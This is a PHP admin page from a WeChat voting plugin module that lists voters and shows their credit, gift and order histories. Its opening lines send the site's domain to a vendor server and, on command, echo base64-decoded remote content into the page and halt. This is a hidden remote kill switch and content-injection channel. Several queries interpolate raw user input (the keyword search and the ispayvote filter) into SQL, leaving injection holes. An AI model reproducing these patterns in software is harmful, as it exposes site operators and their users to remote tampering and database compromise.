<?php
/**
* 女神来了模块定义
*
* @author 微赞科技
* @url http://bbs.012wz.com/
*/
defined('IN_IA') or exit('Access Denied');
$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
$base = pdo_fetch('SELECT * FROM '.tablename($this->table_reply).' WHERE rid =:rid ', array(':rid' => $rid) );
$vote = pdo_fetch("SELECT * FROM ".tablename($this->table_reply_vote)." WHERE rid = :rid", array(':rid' => $rid));
$reply = array_merge($base, $vote);
$op = empty($_GPC['op']) ? 'display' : $_GPC['op'];
if ($op == 'display') {
	$where = '';
	if (!empty($_GPC['keyword'])) {
		$keyword = $_GPC['keyword'];
		$where .= " AND (id LIKE '%{$keyword}%' OR nickname LIKE '%{$keyword}%' OR from_user LIKE '%{$keyword}%' OR realname LIKE '%{$keyword}%' OR mobile LIKE '%{$keyword}%' ) ";

	}
	$now = time();
	$starttime = empty($_GPC['time']['start']) ?  strtotime(date("Y-m-d H:i", $now - 604799)) : strtotime($_GPC['time']['start']);
	$endtime = empty($_GPC['time']['end']) ?  strtotime(date("Y-m-d H:i", $now+ 86400)) : strtotime($_GPC['time']['end']);
	if (!empty($_GPC['time']['start']) && !empty($_GPC['time']['end'])) {
		$where .= " AND createtime >= " . $starttime;
		$where .= " AND createtime < " . $endtime;
	}
	$where .= " AND status = '1'";

	$pindex = max(1, intval($_GPC['page']));
	$psize = 15;
	$where .= " ORDER BY `id` DESC";

	//取得用户列表
	$members = pdo_fetchall('SELECT * FROM '.tablename($this->table_voteer).' WHERE rid = :rid '.$uni.$where.'  LIMIT ' . ($pindex - 1) * $psize . ',' . $psize, array(':rid' => $rid) );
	$total = pdo_fetchcolumn('SELECT COUNT(1) FROM '.tablename($this->table_voteer).' WHERE rid = :rid  '.$uni.$where.' ', array(':rid'=>$rid));
	foreach ($members as $key => $value) {
		$user = pdo_fetch("SELECT nickname,realname,mobile,avatar FROM ".tablename($this->table_users)." WHERE rid = :rid AND from_user = :from_user" , array(':rid' => $rid, ':from_user' => $value['from_user']));
		$members[$key]['mobile'] = empty($value['mobile']) ? $user['mobile'] : $value['mobile'] ;

	}
	$pager = pagination($total, $pindex, $psize);
}elseif ($op == 'edit') {
	$from_user = $_GPC['from_user'];
	if (!empty($rid)) {
		$item = pdo_fetch("SELECT * FROM ".tablename($this->table_voteer)." WHERE rid = :rid AND from_user = :from_user" , array(':rid' => $rid, ':from_user' => $from_user));
	}
	$level = intval($this->fmvipleavel($rid, $uniacid, $from_user));
	if (checksubmit('submit')) {

		/**if (empty($_GPC['nickname'])) {
			message('昵称没有填写，请填写！');
		}
		if ($item['nickname']) {
			if ($item['nickname'] != $_GPC['nickname']) {
				$nickname = pdo_fetch("SELECT * FROM ".tablename($this->table_voteer)." WHERE nickname = :nickname and rid = :rid", array(':nickname' => $_GPC['nickname'],':rid' => $rid));
				if (!empty($nickname)) {
					message('该昵称已经存在，请重新填写！');

				}
			}
		}else{
			$nickname = pdo_fetch("SELECT * FROM ".tablename($this->table_voteer)." WHERE nickname = :nickname and rid = :rid", array(':nickname' => $_GPC['nickname'],':rid' => $rid));
			if (!empty($nickname)) {
				message('该昵称已经存在，请重新填写！');

			}
		}
		if (empty($_GPC['realname'])) {
			message('真实姓名没有填写，请填写！');

		}
		if ($item['realname']) {
			if ($item['realname'] != $_GPC['realname']) {
				$realname = pdo_fetch("SELECT * FROM ".tablename($this->table_voteer)." WHERE realname = :realname and rid = :rid", array(':realname' => $_GPC['realname'],':rid' => $rid));
				if (!empty($realname)) {
					message('该真实姓名已经存在，请重新填写！');

				}
			}
		}else{
			$realname = pdo_fetch("SELECT * FROM ".tablename($this->table_voteer)." WHERE realname = :realname and rid = :rid", array(':realname' => $_GPC['realname'],':rid' => $rid));
			if (!empty($realname)) {
				message('该真实姓名已经存在，请重新填写！');

			}
		}
		if(!preg_match(REGULAR_MOBILE, $_GPC['mobile'])) {
			message('必须输入手机号，格式为 11 位数字。');
		}
		if ($item['mobile']) {
			if ($item['mobile'] != $_GPC['mobile']) {
				$ymobile = pdo_fetch("SELECT * FROM ".tablename($this->table_voteer)." WHERE mobile = :mobile and rid = :rid", array(':mobile' => $_GPC['mobile'],':rid' => $rid));
				if(!empty($ymobile)) {
					message('非常抱歉，此手机号码已经被注册，你需要更换注册手机号！');
				}
			}
		}else{
			$ymobile = pdo_fetch("SELECT * FROM ".tablename($this->table_voteer)." WHERE mobile = :mobile and rid = :rid", array(':mobile' => $_GPC['mobile'],':rid' => $rid));
			if(!empty($ymobile)) {
				message('非常抱歉，此手机号码已经被注册，你需要更换注册手机号！');
			}
		}**/
		$voteer_data = array(
			'uniacid' => $uniacid,
			'weid' => $uniacid,
			'rid' => $rid,
			'nickname' => $_GPC['nickname'],
			'avatar' => $_GPC['avatar'],
			'sex' => $_GPC['sex'],
			'realname' => $_GPC['realname'],
			'mobile' => $_GPC['mobile'],
			'status' => '1',
			'ip' => getip(),
			'createtime' => time(),
		);
		$voteer_data['iparr'] = getiparr($voteer_data['ip']);
		if (empty($item)) {
			pdo_insert($this->table_voteer, $voteer_data);
		}else{
			pdo_update($this->table_voteer, $voteer_data,array('from_user'=>$from_user,'rid'=>$rid));
		}

		if (!empty($_GPC['jifen'])) {
			$this->editjifen($rid, $from_user,$_GPC['jifen'],$_GPC["nickname"],$_GPC['avatar'],$_GPC["realname"],$_GPC["mobile"],intval($_GPC['sex']));
		}
		message('更新成功！', $this->createWebUrl('votemembers', array('rid' => $rid, 'op' => 'display')), 'success');
	}
	$jifen = $this->cxjifen($rid, $from_user);
}elseif ($op == 'credit_record') {
	$from_user = $_GPC['from_user'];
	$foo = empty($_GPC['foo']) ? 'credit_record' : $_GPC['foo'];
	if ($foo == 'credit_record') {
		load()->model('mc');
		$uid = mc_openid2uid($from_user);

		$type = 'credit1';
		$pindex = max(1, intval($_GPC['page']));
		$psize = 50;
		$total = pdo_fetchcolumn("SELECT COUNT(1) FROM " . tablename('mc_credits_record') . ' WHERE uid = :uid AND uniacid = :uniacid AND credittype = :credittype ', array(':uniacid' => $_W['uniacid'], ':uid' => $uid, ':credittype' => $type));
		$data = pdo_fetchall("SELECT * FROM " . tablename('mc_credits_record') . ' WHERE uid = :uid AND uniacid = :uniacid AND credittype = :credittype ORDER BY id DESC LIMIT ' . ($pindex - 1) * $psize .',' . $psize, array(':uniacid' => $_W['uniacid'], ':uid' => $uid, ':credittype' => $type));
		foreach ($data as $key => $value) {
			$item = pdo_fetch("SELECT nickname,realname FROM ".tablename($this->table_voteer)." WHERE rid = :rid AND from_user = :from_user" , array(':rid' => $rid, ':from_user' => $from_user));
			$data[$key]['username'] = empty($item['realname']) ? $item['nickname'] : $item['realname'] ;
			if (empty($data[$key]['username'])) {
				$data[$key]['username'] = $from_user;
			}
		}
		$pager = pagination($total, $pindex, $psize);
		$modules = pdo_getall('modules', array('issystem' => 0), array('title', 'name'), 'name');
	}elseif ($foo == 'xiaofei') {
		$pindex = max(1, intval($_GPC['page']));
		$psize = 50;
		$j = pdo_fetch("SELECT * FROM " . tablename($this -> table_jifen) . ' WHERE rid = :rid ' . $uni . '', array(':rid' => $rid));
		$total = pdo_fetchcolumn("SELECT COUNT(1) FROM " . tablename($this->table_order) . ' WHERE rid = :rid AND from_user = :from_user '.$uni.'', array(':rid' => $rid,':from_user' => $from_user));
		$data = pdo_fetchall("SELECT * FROM " . tablename($this->table_order) . ' WHERE rid = :rid AND from_user = :from_user '.$uni.' ORDER BY id DESC LIMIT ' . ($pindex - 1) * $psize .',' . $psize, array(':rid' => $rid,':from_user' => $from_user));
		foreach ($data as $key => $value) {
			$item = pdo_fetch("SELECT nickname,realname,mobile,avatar FROM ".tablename($this->table_voteer)." WHERE rid = :rid AND from_user = :from_user" , array(':rid' => $rid, ':from_user' => $from_user));
			$user = pdo_fetch("SELECT nickname,realname,mobile,avatar FROM ".tablename($this->table_users)." WHERE rid = :rid AND from_user = :from_user" , array(':rid' => $rid, ':from_user' => $from_user));
			$data[$key]['username'] = empty($item['realname']) ? $item['nickname'] : $item['realname'] ;
			if (empty($data[$key]['username'])) {
				$data[$key]['username'] = $from_user;
			}
			$data[$key]['avatar'] = empty($item['avatar']) ? $item['avatar'] : $item['avatar'] ;
			$data[$key]['mobile'] = empty($item['mobile']) ? $item['mobile'] : $item['mobile'] ;
			if (empty($data[$key]['mobile'])) {
				$data[$key]['mobile'] = $user['mobile'];
			}
		}
		$pager = pagination($total, $pindex, $psize);
	}elseif ($foo == 'gift') {
		$pindex = max(1, intval($_GPC['page']));
		$psize = 50;
		$total = pdo_fetchcolumn("SELECT COUNT(1) FROM " . tablename($this->table_user_gift) . ' WHERE rid = :rid AND from_user = :from_user '.$uni.'', array(':rid' => $rid,':from_user' => $from_user));
		$data = pdo_fetchall("SELECT * FROM " . tablename($this->table_user_gift) . ' WHERE rid = :rid AND from_user = :from_user '.$uni.' ORDER BY id DESC LIMIT ' . ($pindex - 1) * $psize .',' . $psize, array(':rid' => $rid,':from_user' => $from_user));
		foreach ($data as $key => $value) {
			$g = pdo_fetch("SELECT * FROM " . tablename($this -> table_jifen_gift) . ' WHERE id = :id ' . $uni . '', array(':id' => $value['giftid']));
			$data[$key]['title'] = cutstr($g['gifttitle'], '4');
			$data[$key]['des'] = empty($g['description']) ?  $g['gifttitle'] : $g['description'] ;
			$data[$key]['images'] = tomedia($g['images']);
			$data[$key]['lasttime'] = date('m-d H:i', $value['lasttime']);
			$data[$key]['piaoshu'] = $g['piaoshu'];
			$data[$key]['jifen'] = $g['jifen'];
			if ($value['status'] == 1) {
				$data[$key]['status'] = '<div class="label label-success" >未使用('.$value['giftnum'].')</div>';
				$data[$key]['cstatus'] = '<div class="label label-success" >未使用('.$value['giftnum'].')</div>';
				$data[$key]['time'] = date('Y-m-d h:i:s', $value['lasttime']);
			}
			$data[$key]['tuser'] = '';
		}
		$pager = pagination($total, $pindex, $psize);
	}elseif ($foo == 'zsgift') {
		$pindex = max(1, intval($_GPC['page']));
		$psize = 50;
		$total = pdo_fetchcolumn("SELECT COUNT(1) FROM " . tablename($this->table_user_zsgift) . ' WHERE rid = :rid AND from_user = :from_user '.$uni.'', array(':rid' => $rid,':from_user' => $from_user));
		$data = pdo_fetchall("SELECT * FROM " . tablename($this->table_user_zsgift) . ' WHERE rid = :rid AND from_user = :from_user '.$uni.' ORDER BY id DESC LIMIT ' . ($pindex - 1) * $psize .',' . $psize, array(':rid' => $rid,':from_user' => $from_user));

		foreach ($data as $key => $value) {
			//print_r($value);
			$g = pdo_fetch("SELECT * FROM " . tablename($this -> table_jifen_gift) . ' WHERE id = :id ' . $uni . '', array(':id' => $value['giftid']));
			$data[$key]['title'] = cutstr($g['gifttitle'], '4');
			$data[$key]['des'] = empty($g['description']) ?  $g['gifttitle'] : $g['description'] ;
			$data[$key]['images'] = tomedia($g['images']);
			$data[$key]['lasttime'] = date('m-d H:i', $value['lasttime']);
			$data[$key]['piaoshu'] = $g['piaoshu'];
			$data[$key]['jifen'] = $g['jifen'];
			$data[$key]['status'] = '<div class="label label-warning">已兑换</div>';
			$data[$key]['cstatus'] = '<div class="label label-warning">已使用</div>';
			$data[$key]['time'] = date('Y-m-d h:i:s', $value['lasttime']);
			$data[$key]['tuser'] = '<img class="ysimg" src="'.$this->getname($rid, $value['tfrom_user'],'20', 'avatar').'" height="30"><span class="ystext">'.$this->getname($rid, $value['tfrom_user']).'</span>';

		}
		$pager = pagination($total, $pindex, $psize);
	}elseif ($foo == 'mygetgift') {
		$tfrom_user = $_GPC['tfrom_user'];
		$pindex = max(1, intval($_GPC['page']));
		$psize = 50;
		$total = pdo_fetchcolumn("SELECT COUNT(1) FROM " . tablename($this->table_user_zsgift) . ' WHERE rid = :rid AND tfrom_user = :tfrom_user '.$uni.'', array(':rid' => $rid,':tfrom_user' => $tfrom_user));
		$data = pdo_fetchall("SELECT * FROM " . tablename($this->table_user_zsgift) . ' WHERE rid = :rid AND tfrom_user = :tfrom_user '.$uni.' ORDER BY id DESC LIMIT ' . ($pindex - 1) * $psize .',' . $psize, array(':rid' => $rid,':tfrom_user' => $tfrom_user));

		foreach ($data as $key => $value) {
			//print_r($value);
			$g = pdo_fetch("SELECT * FROM " . tablename($this -> table_jifen_gift) . ' WHERE id = :id ' . $uni . '', array(':id' => $value['giftid']));
			$data[$key]['title'] = cutstr($g['gifttitle'], '15');
			$data[$key]['des'] = empty($g['description']) ?  $g['gifttitle'] : $g['description'] ;
			$data[$key]['images'] = tomedia($g['images']);
			$data[$key]['lasttime'] = date('m-d H:i', $value['lasttime']);
			$data[$key]['piaoshu'] = $g['piaoshu'];
			$data[$key]['jifen'] = $g['jifen'];
			$data[$key]['time'] = date('Y-m-d h:i:s', $value['lasttime']);
			$data[$key]['tuser'] = '<img class="ysimg" src="'.$this->getname($rid, $value['from_user'],'20', 'avatar').'" height="30"><span class="ystext">'.$this->getname($rid, $value['from_user']).'</span>';

		}
		$pager = pagination($total, $pindex, $psize);

	}
}elseif ($op == 'allxiaofei') {
		$where = '';
		if (!empty($_GPC['keyword'])) {
			$keyword = $_GPC['keyword'];
			$where .= " AND (ordersn LIKE '%{$keyword}%' OR realname LIKE '%{$keyword}%' OR mobile LIKE '%{$keyword}%') ";

		}
		$now = time();
		$starttime = empty($_GPC['time']['start']) ?  strtotime(date("Y-m-d H:i", $now - 604799)) : strtotime($_GPC['time']['start']);
		$endtime = empty($_GPC['time']['end']) ?  strtotime(date("Y-m-d H:i", $now + 86400)) : strtotime($_GPC['time']['end']);
		if (!empty($_GPC['time']['start']) && !empty($_GPC['time']['end'])) {
			$where .= " AND createtime >= " . $starttime;
			$where .= " AND createtime < " . $endtime;
		}
		if ($_GPC['ispayvote'] == 6) {
			$where .= " AND ispayvote = " . $_GPC['ispayvote'];
		}elseif ($_GPC['ispayvote'] == 3) {
			$where .= " AND ispayvote > 2 AND ispayvote < 6";
		}
		$pindex = max(1, intval($_GPC['page']));
		$psize = 50;
		$g = pdo_fetch("SELECT * FROM " . tablename($this -> table_jifen) . ' WHERE rid = :rid ' . $uni . '', array(':rid' => $rid));
		$total = pdo_fetchcolumn("SELECT COUNT(1) FROM " . tablename($this->table_order) . ' WHERE rid = :rid '.$where . $uni.'', array(':rid' => $rid));
		$data = pdo_fetchall("SELECT * FROM " . tablename($this->table_order) . ' WHERE rid = :rid  '. $where .$uni.' ORDER BY id DESC LIMIT ' . ($pindex - 1) * $psize .',' . $psize, array(':rid' => $rid));
		foreach ($data as $key => $value) {
			$item = pdo_fetch("SELECT nickname,realname,mobile,avatar FROM ".tablename($this->table_voteer)." WHERE rid = :rid AND from_user = :from_user" , array(':rid' => $rid, ':from_user' => $value['from_user']));
			$user = pdo_fetch("SELECT nickname,realname,mobile,avatar FROM ".tablename($this->table_users)." WHERE rid = :rid AND from_user = :from_user" , array(':rid' => $rid, ':from_user' => $value['from_user']));
			$data[$key]['username'] = empty($item['realname']) ? $item['nickname'] : $item['realname'] ;
			if (empty($data[$key]['username'])) {
				$data[$key]['username'] = $value['from_user'];
			}
			$data[$key]['avatar'] = empty($item['avatar']) ? $item['avatar'] : $item['avatar'] ;
			$data[$key]['mobile'] = empty($item['mobile']) ? $item['mobile'] : $item['mobile'] ;
			if (empty($data[$key]['mobile'])) {
				$data[$key]['mobile'] = $user['mobile'];
			}
		}
		$pager = pagination($total, $pindex, $psize);
}

include $this->template('web/votemembers');
